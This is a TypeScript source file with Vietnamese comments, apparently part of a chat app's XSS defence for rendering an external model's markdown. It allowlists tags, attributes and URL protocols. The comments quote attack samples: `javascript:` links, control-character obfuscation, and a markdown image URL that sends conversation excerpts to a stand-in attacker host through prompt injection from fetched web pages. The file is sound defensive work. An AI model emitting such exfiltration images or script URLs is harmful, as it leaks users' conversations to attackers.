/**
 * Bien XSS cua ca app — §20 dong "XSS", T-3.5.
 *
 * Dau vao cua renderer markdown la chu do MOT MODEL BEN NGOAI sinh ra, va tu
 * Phase 6 tro di con them noi dung web fetch di qua model (§20 dong "Prompt
 * injection"). Khong co mot buoc nao khac giua chuoi ay va DOM, nen ba lop
 * duoi day la toan bo hang rao.
 *
 * ╔════════════════════════════════════════════════════════════════════════╗
 * ║  BA LOP, DOC LAP VOI NHAU                                              ║
 * ╚════════════════════════════════════════════════════════════════════════╝
 *
 * **Lop 1 — HTML tho khong bao gio duoc phan tich.** `react-markdown` dung
 * mac dinh khong co `rehype-raw`, nen `<script>`, `<img onerror>`, `<iframe>`
 * trong chu cua model di thang thanh CHU, khong thanh phan tu. Day la lop
 * manh nhat vi no khong loc gi ca — no khong tao ra thu can loc. Doi lai,
 * mot cai gia da duoc nhin thay va chap nhan: model KHONG viet duoc HTML.
 * Cho de HTML chay la origin phu cua artifact (§14.3, ADR-10), khong phai day.
 *
 * **Lop 2 — allowlist the va thuoc tinh** (`SANITIZE_SCHEMA`). Chay du lop 1
 * da dung: no chan mot plugin remark/rehype nao do sau nay sinh ra phan tu
 * ngoai danh sach, va no la cho duy nhat noi ra Scarlet cho phep the nao.
 *
 * **Lop 3 — allowlist giao thuc URL** (`safeUrl`). `[x](javascript:alert(1))`
 * KHONG di qua lop 1: markdown that su sinh mot the `<a>` that su. Lop nay
 * va `protocols` cua lop 2 chan no hai lan.
 *
 * ┌──────────────────────────────────────────────────────────────────────┐
 * │  `img` CO Y KHONG NAM TRONG DANH SACH                                │
 * └──────────────────────────────────────────────────────────────────────┘
 *
 * `![](http://ke-tan-cong/?d=<trich doan hoi thoai>)` la duong ro ri du
 * lieu kinh dien cua markdown: trinh duyet tu goi GET, khong ai bam gi ca.
 * §20 da ghi prompt injection la moi de doa song, va Phase 6 se cho model
 * doc noi dung web — tuc ke tan cong khong can chiem model, chi can mot
 * trang web. The `img` bi bo khoi allowlist cho toi khi co mot duong tai anh
 * qua proxy cua chinh minh (B-235).
 */

/** Giao thuc duy nhat mot URL trong chu cua model duoc phep mang. */
const SAFE_PROTOCOLS: ReadonlySet<string> = new Set(["http:", "https:", "mailto:"]);

/**
 * Lop 3 — tra ve URL neu an toan, chuoi rong neu khong.
 *
 * Xoa ky tu dieu khien TRUOC khi doc giao thuc: `java\u0000script:` va
 * `java\tscript:` la hai chuoi ma trinh duyet van hieu la `javascript:`, con
 * mot phep so sanh chuoi ngay tho thi khong.
 *
 * URL tuong doi (`#neo`, `/duong-dan`, `./tep`) khong co giao thuc nen khong
 * the la `javascript:` — cho di qua nguyen van.
 */
export function safeUrl(url: string): string {
  const goned = url.replace(/[\u0000- \u007f- ]/g, "");
  const scheme = /^([a-z][a-z0-9+.-]*):/i.exec(goned);
  if (scheme === null) {
    return url;
  }
  return SAFE_PROTOCOLS.has(`${scheme[1].toLowerCase()}:`) ? url : "";
}

/**
 * Lop 2 — allowlist cho `rehype-sanitize`.
 *
 * Viet ra day du thay vi noi dai `defaultSchema` cua GitHub: danh sach ay co
 * ca `img`, `details`, `summary`, `abbr`… va no doi theo phien ban thu vien.
 * Mot allowlist ma khong ai doc het duoc thi khong con la allowlist.
 */
export const SANITIZE_SCHEMA = {
  /**
   * The bi xoa CA NOI DUNG. Mac dinh cua thu vien la "the la thay bang phan
   * ben trong no", dung cho `<span>` nhung sai cho `<script>`: no se bien
   * `alert(1)` thanh chu hien tren man hinh.
   */
  strip: ["script", "style", "iframe", "object", "embed", "noscript", "template"],
  tagNames: [
    "p",
    "br",
    "hr",
    "h1",
    "h2",
    "h3",
    "h4",
    "h5",
    "h6",
    "strong",
    "em",
    "del",
    "code",
    "pre",
    "blockquote",
    "ul",
    "ol",
    "li",
    "a",
    "table",
    "thead",
    "tbody",
    "tr",
    "th",
    "td",
    // GFM task list: `- [ ] viec` sinh mot <input type="checkbox" disabled>.
    "input",
  ],
  attributes: {
    a: ["href", "title"],
    // `language-ts` cua hang ``` — `CodeBlock` doc nhan ngon ngu tu day.
    code: ["className"],
    th: ["align"],
    td: ["align"],
    input: ["type", "checked", "disabled"],
    // Khong mot thuoc tinh nao khac, tren bat cu the nao. Dong nay la thu
    // chan `onerror` / `onclick` / `style` neu mot ngay nao do lop 1 bi go.
    "*": [],
  },
  /** Chi checkbox cua GFM; `<input type="text">` khong co viec gi o day. */
  required: {
    input: { type: "checkbox", disabled: true },
  },
  protocols: {
    href: ["http", "https", "mailto"],
  },
  /** Khong cho phep comment HTML di vao cay. */
  allowComments: false,
  /** Khong cho phep doctype. */
  allowDoctypes: false,
} as const;
